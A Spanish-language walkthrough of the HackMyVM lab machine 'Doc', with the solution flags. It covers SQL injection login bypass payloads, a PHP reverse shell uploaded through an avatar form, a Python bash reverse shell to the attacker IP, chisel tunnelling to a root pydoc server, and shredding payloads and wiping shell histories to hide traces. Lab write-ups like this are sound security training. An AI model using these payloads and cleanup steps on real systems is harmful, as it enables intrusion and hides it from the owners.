---
tags:
  - estado/completo
plataforma: "[[HackMyVM]]"
web: https://hackmyvm.eu/machines/machine.php?vm=Doc
dificultad: Fácil
os: Linux
relacionados:
  - "[[sqlmap]]"
  - "[[Arbitrary File Upload]]"
  - "[[chisel]]"
  - "[[Port Forwarding]]"
  - "[[shred]]"
  - "[[SQL Injection (SQLi)]]"
---
#  Hack My VM - Doc

## Reconocimiento

### Ping

Comenzamos nuestro reconocimiento ejecutando un **ping sweep** en busca de dispositivos activos, identificando sus **IP** y **TTL** en nuestra red local.

```
for i in {1..254} ;do (ping -c 1 10.0.2.$i | grep "bytes from" &) ;done
```

```
64 bytes from 10.0.2.1: icmp_seq=1 ttl=255 time=0.649 ms
64 bytes from 10.0.2.4: icmp_seq=1 ttl=64 time=0.051 ms
64 bytes from 10.0.2.3: icmp_seq=1 ttl=255 time=0.634 ms
64 bytes from 10.0.2.2: icmp_seq=1 ttl=128 time=2.28 ms
64 bytes from 10.0.2.6: icmp_seq=1 ttl=64 time=2.05 ms
```

### Nmap

Ejecutamos nuestro reconocimiento de puertos con **Nmap**, verificando puertos abiertos, servicios, versiones y **scripts** predeterminados para vulnerar.

```
sudo nmap -sC -sV -v 10.0.2.6 -p- --open --min-rate 1000 -oN scanDoc
```

```
# Nmap 7.94SVN scan initiated Sat Jun 22 15:28:29 2024 as: nmap -sC -sV -v -p- --open --min-rate 1000 -oN scanDoc 10.0.2.6
Nmap scan report for 10.0.2.6
Host is up (0.0015s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0
|_http-title: Online Traffic Offense Management System - PHP
| http-methods: 
|_  Supported Methods: GET HEAD POST
│ MAC Address: 08:00:27:40:BF:40 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 22 15:29:37 2024 -- 1 IP address (1 host up) scanned in 68.09 seconds
```

### Explorando URL

Después de navegar en **IP** nos encontramos con un botón que nos redirige hacia el directorio **/admin** pero no podemos acceder ya que no encuentra la ruta, para eso modificaremos el **/etc/hosts**.

![](https://0xjotarosecure.gitbook.io/~gitbook/image?url=https%3A%2F%2F3685264991-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F7ncxznQcS5nOCGtgTnGH%252Fuploads%252Fz2cyNRhKfgoQovGd9Hz0%252F10.0.2.6.png%3Falt%3Dmedia%26token%3Dcf628559-1cc1-4c4b-83f7-d867c5b97802&width=768&dpr=4&quality=100&sign=a8956f0c&sv=2)

#### Modificando /etc/hosts

```
echo "10.0.2.6  doc.hmv" | sudo tee -a /etc/hosts
```

Ahora si nos redirige correctamente hacia el directorio **/admin** y vemos que esta ejecutando el archivo **login.php** el cual nos muestra un formulario de inicio de sesión. Esto nos da una pista de que puede que haya una vulnerabilidad de **SQL Injection**, vamos a comprobarlo con **sqlmap**.

![](https://0xjotarosecure.gitbook.io/~gitbook/image?url=https%3A%2F%2F3685264991-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F7ncxznQcS5nOCGtgTnGH%252Fuploads%252FwGYpdczWDr6fhvLEg4Wl%252Flogin.png%3Falt%3Dmedia%26token%3D9f381198-0bb1-4fe1-ac97-73b448459faa&width=768&dpr=4&quality=100&sign=4937fddd&sv=2)

___

## Explotación de vulnerabilidades

### [[SQL Injection (SQLi)|SQL Injection (SQLI)]]

Tenemos dos formas de usar [[sqlmap]]:

1. Pasando un archivo en el cual este la petición **HTTP** del login.

Para esto interceptaremos la petición **HTTP** con **Burp Suite** y lo pegaremos en un **.txt**.
```
POST /classes/Login.php?f=login HTTP/1.1
Host: doc.hmv
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 29
Origin: http://doc.hmv
Connection: close
Referer: http://doc.hmv/admin/login.php
Cookie: PHPSESSID=6ltkg89jqdqd4ea2ht758oq6cq

username=admin&password=admin
```

Ahora corremos el siguiente comando:
```
sqlmap -r request.txt --level 3 --risk 3 --batch
```

2. Pasando la **url** y la **cookie**.
    
```
sqlmap -u http://doc.hmv/admin/login.php --cookie='PHPSESSID=6ltkg89jqdqd4ea2ht758oq6cq' --level 3 --risk 3 --batch
```

Sea cual sea la forma que se elija para usar **sqlmap**, este es el resultado:
```
SQL Injection with sqlmap log:
sqlmap identified the following injection point(s) with a total of 399 HTTP(s) requests:
---
Parameter: username (POST)
	Type: boolean-based blind
	Title: OR boolean-based blind - WHERE or HAVING clause
	Payload: username=-2409' OR 9836=9836-- Yvja&password=admin
	
	Type: time-based blind
	Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
	Payload: username=admin' AND (SELECT 6555 FROM (SELECT(SLEEP(5)))IZke)-- iCuF&password=admin
---
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
```

Podemos ver que encontro 2 vulnerabilidades, podemos atacar de 2 formas:

1. En el campo de Username ingresando: **2409' OR 9836=9836-- Yvja** y cualquier password
    
2. En el campo de Username ingresando: **admin' AND (SELECT 6555 FROM (SELECT(SLEEP(5)))IZke)-- iCuF** y cualquier password
    

![](https://0xjotarosecure.gitbook.io/~gitbook/image?url=https%3A%2F%2F3685264991-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F7ncxznQcS5nOCGtgTnGH%252Fuploads%252Flz4sML9eRo1BHFAFeyt7%252Fsql_injection.png%3Falt%3Dmedia%26token%3Dcdba6327-5ea3-41a4-9a74-137374ee55da&width=768&dpr=4&quality=100&sign=97d4f2e7&sv=2)

### Explorando Panel de Admin

Después de navegar por el panel de admin nos encontramos con que podemos subir un archivo por medio de un **input** mal configurado para subir una imagen para cambiar el avatar, esto nos da la posibilidad de explotar la vulnerabilidad [[Arbitrary File Upload]].

![](https://0xjotarosecure.gitbook.io/~gitbook/image?url=https%3A%2F%2F3685264991-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F7ncxznQcS5nOCGtgTnGH%252Fuploads%252FXbbs4Y1MCUHO6eCY8Xs5%252Fmy_account.png%3Falt%3Dmedia%26token%3Ddcea3db0-9df5-4d7c-a028-d214ebef2312&width=768&dpr=4&quality=100&sign=a91e2360&sv=2)

### [[Arbitrary File Upload]]

Busco una reverse shell para php, kali linux tiene una  que ya viene en el sistema: 
```bash
sudo find / -name "*reverse-shell*" 2>/dev/null
```

En caso de no tener eso puedo usar la web: [Reverse Shell Generator](https://www.revshells.com/).

Ahora ponemos en escucha nuestra maquina.
```
nc -lvnp 443
```

Y subimos la **reverse shell**.

![](https://0xjotarosecure.gitbook.io/~gitbook/image?url=https%3A%2F%2F3685264991-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F7ncxznQcS5nOCGtgTnGH%252Fuploads%252FWgHCvdi2GIMktXN0kHB0%252Freverse_shell.png%3Falt%3Dmedia%26token%3Df5b9ed1d-d5f3-44bb-a839-47c2429c1bae&width=768&dpr=4&quality=100&sign=96a2be34&sv=2)

Haremos el debido tratamiento de la **stty** para tener una **shell** interactiva.
```
script /dev/null -c bash
^Z
stty raw -echo; fg
reset xterm
export SHELL=bash
export TERM=xterm
```

En una **terminal** aparte correremos el siguiente comando para saber el tamaño de la **stty**.
```
stty size
```

Volvemos a la **reverse shell** y corremos el comando.
```
stty rows 30 columns 130
```

## Escalada de privilegios

Lo primero que hacemos es mirar que permisos de usuarios tenemos.
```
sudo -l
```

Vemos que con el usuario actual no podemos hacer mucho asi que haremos un movimiento lateral.

### Movimiento Lateral

Vamos a buscar los posibles usuarios, para eso vamos a leer **/etc/passwd**.
```
cat /etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
bella:x:1000:1000:bella,,,:/home/bella:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
```

Encontramos un usuario que nos servirá, **bella**.

Luego de buscar en los directorios y archivos, encontramos el archivo **initialize.php** en **~/html/traffic_offense** que contiene datos interesantes.
```
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
if(!defined('base_url')) define('base_url','http://doc.hmv/');
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"bella");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"be114yTU");
if(!defined('DB_NAME')) define('DB_NAME',"doc");
?>
```

Encontramos la password del usuario **bella** el cual es **be114yTU**, procedemos a ingresar al usuario.
```
su -l bella
```

![](https://0xjotarosecure.gitbook.io/~gitbook/image?url=https%3A%2F%2F3685264991-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F7ncxznQcS5nOCGtgTnGH%252Fuploads%252FxLRB4lNK7NJBui1fZJdx%252Flateral_movement.png%3Falt%3Dmedia%26token%3D48bff551-599e-4787-bdb3-7ebe725f53ac&width=768&dpr=4&quality=100&sign=3e728fdd&sv=2)

Buscando encontramos el **flag** del **user**.
```
HMVtakemydocs
```

### Escalando al usuario root

Buscaremos que permisos tenemos con el usuario bella.
```
sudo -l
```

![](https://0xjotarosecure.gitbook.io/~gitbook/image?url=https%3A%2F%2F3685264991-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F7ncxznQcS5nOCGtgTnGH%252Fuploads%252FHjAzldmsTKdtCKmw8rzw%252Fsudo_l.png%3Falt%3Dmedia%26token%3D9e8d5a9a-0c42-42d3-8972-cf80c769c07f&width=768&dpr=4&quality=100&sign=a883cac1&sv=2)

Vemos que podemos ejecutar **/usr/bin/doc** sin necesidad de ser **root**, vamos a mirar que contiene. Como es un **binario** tendremos que ver los **strings**.

```
strings /usr/bin/doc
```

```
/lib64/ld-linux-x86-64.so.2
system
__cxa_finalize
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
/usr/bin/pydoc3.9 -p 7890
;*3$"
GCC: (Debian 10.2.1-6) 10.2.1 20210110
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.0
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
doc.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@GLIBC_2.2.5
__libc_start_main@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
__TMC_END__
_ITM_registerTMCloneTable
__cxa_finalize@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.got.plt
.data
.bss
.comment
```

Después de analizar el archivo encontramos algo interesante y es **/usr/bin/pydoc3.9 -p 7890**, si buscamos la documentación vemos que el modulo sirve para crear un **servidor**. Esto nos da una posibilidad para ejecutar una **reverse shell** con **root** pero tenemos un problema, no podemos acceder desde nuestra maquina al **servidor** creado. Tendremos que hacer un [[Port Forwarding]] para redireccionar el trafico de red hacia nuestra maquina y poder acceder al **servidor**, para eso usaremos **chisel**.

Descargaremos [[chisel]] en nuestra maquina local.
```
wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
```

Descomprimimos el **.gz** y le damos permisos al **binario**.
```
gunzip chisel_1.9.1_linux_amd64.gz
chmod +x chisel_1.9.1_linux_amd64
```

Ahora subiremos el **binario** hacia nuestra maquina victima.

Maquina local:
```
python3 -m http.server 8001
```

Maquina victima:
```
wget <Mi_IP>:8001/chisel
chmod +x chisel
```

Tendremos que correr **chisel** en modo **servidor inverso** en nuestra maquina:
```
sudo ./chisel server --reverse -p 4445
```

Y en la maquina victima correr **chisel** en modo **cliente**:
```
./chisel client <Mi_IP>:4445 R:7890:127.0.0.1:7890 &
sudo doc
```
- `<Mi_IP>:4445`: Especifica la IP de la máquina local (servidor) y el puerto **4445** al que el cliente se conectará.
- `R:7890:127.0.0.1:7890`: Configura un túnel inverso:
    - `R`: Define un túnel inverso.
    - `7890`: Puerto en el servidor (máquina local) donde se escuchará el tráfico reenviado.
    - `127.0.0.1:7890`: Dirección y puerto en la máquina víctima a los que se reenviará el tráfico.

![](https://0xjotarosecure.gitbook.io/~gitbook/image?url=https%3A%2F%2F3685264991-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F7ncxznQcS5nOCGtgTnGH%252Fuploads%252FlgqpIJPKgBkKStOsCCRA%252Fchisel.png%3Falt%3Dmedia%26token%3D8fa70767-9536-4240-bef5-468b91057499&width=768&dpr=4&quality=100&sign=db3aa02a&sv=2)

![](https://0xjotarosecure.gitbook.io/~gitbook/image?url=https%3A%2F%2F3685264991-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F7ncxznQcS5nOCGtgTnGH%252Fuploads%252FDq44rRsqhigEGwarUSFi%252Fbinario_doc.png%3Falt%3Dmedia%26token%3Dddea3e35-d3dd-4b47-ba5f-3b708b3fb146&width=768&dpr=4&quality=100&sign=1a22808b&sv=2)

Vemos que nos muestra todos los **módulos** de **python** (archivos **.py**) del sistema. Crearemos una **reverse shell** en **python** en la maquina victima asi que nos saldremos de la sesión de **chisel**. Pero antes, como esta corriendo en segundo plano podremos matar el **proceso** buscando el **PID** con **pkill**.

```
pkill -f "chisel client"
```

```
import os
os.system("bash -c 'bash -i >& /dev/tcp/10.0.2.4/1234 0>&1'")
```

Volvemos a correr el **chisel** en modo **cliente** en la maquina victima y corremos el **binario** doc con **sudo**. Buscamos en el navegador en el **servidor** el **modulo** que subimos de **python**. Pero antes pondremos en escucha de una **reverse shell** nuestra maquina local.

```
nc -lvvp 1234
```

![](https://0xjotarosecure.gitbook.io/~gitbook/image?url=https%3A%2F%2F3685264991-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F7ncxznQcS5nOCGtgTnGH%252Fuploads%252F0h0FxcJSaZeos8dFeyDD%252Fpayload_uploaded.png%3Falt%3Dmedia%26token%3Deab1fbad-44d0-4347-88a5-07cf5cd8efac&width=768&dpr=4&quality=100&sign=7b199156&sv=2)

![](https://0xjotarosecure.gitbook.io/~gitbook/image?url=https%3A%2F%2F3685264991-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F7ncxznQcS5nOCGtgTnGH%252Fuploads%252FZAvRH1hbf86BJTXKzHcG%252Fshell_root.png%3Falt%3Dmedia%26token%3Db0ba8777-3c4a-4ba4-b7e6-ab4fcc0bd908&width=768&dpr=4&quality=100&sign=5fbd0c46&sv=2)

Listo ya tenemos acceso **root** y podemos obtener la **flag** de **root**.

![](https://0xjotarosecure.gitbook.io/~gitbook/image?url=https%3A%2F%2F3685264991-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F7ncxznQcS5nOCGtgTnGH%252Fuploads%252FLTiO3MaXRj0anITgRbzD%252Froot_txt.png%3Falt%3Dmedia%26token%3Dfa92ead9-3d4c-4590-887d-6566ec63801e&width=768&dpr=4&quality=100&sign=10f0a4d&sv=2)

```
HMVfinallyroot
```

___

## Limpiando Rastros y Huellas (opcional)

Limpiar los **rastros** y **huellas** que hemos dejado al momento de vulnerar alguna maquina es opcional ya que no influye en la finalidad de obtener las **flag** de **user** y **root**, pero si es una buena practica.

Siendo **root** iremos al directorio donde subimos la **reverse shell** y explotamos la vulnerabilidad **Arbitrary File Upload** que esta en **/var/www/html/traffic_offense/uploads** y corremos el comando **shred**.

```
shred -zun 10 -v 1719118800_php-reverse-shell.php
```

![](https://0xjotarosecure.gitbook.io/~gitbook/image?url=https%3A%2F%2F3685264991-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252F7ncxznQcS5nOCGtgTnGH%252Fuploads%252FKSVQIUnIPpgV3TJBvSgd%252Fshred_reverse_php.png%3Falt%3Dmedia%26token%3Da80f35d6-6e77-4560-8549-bc16f65737b6&width=768&dpr=4&quality=100&sign=fc8a095&sv=2)

Eliminamos también la **reverse shell** en **python** con el mismo comando y limpiamos **.zsh_history** o **.bash_history**.

```
shred -zun 10 -v payload.py
echo ' ' > .zsh_history && echo ' ' > .bash_history
```

Salimos de la sesión **root** y haremos lo mismo para el usuario **bella** eliminando el **binario** de **chisel**.

```
pkill -f "chisel client"
shred -zun 10 -v chisel_1.9.1_linux_amd64
```

Listo ya habremos limpiado nuestro **rastro**.

## Bandera(s)

> [!flag] `flag{usuario}`
> HMVtakemydocs
^bandera-user

> [!flag] `flag{root}`
> HMVfinallyroot
^bandera-root
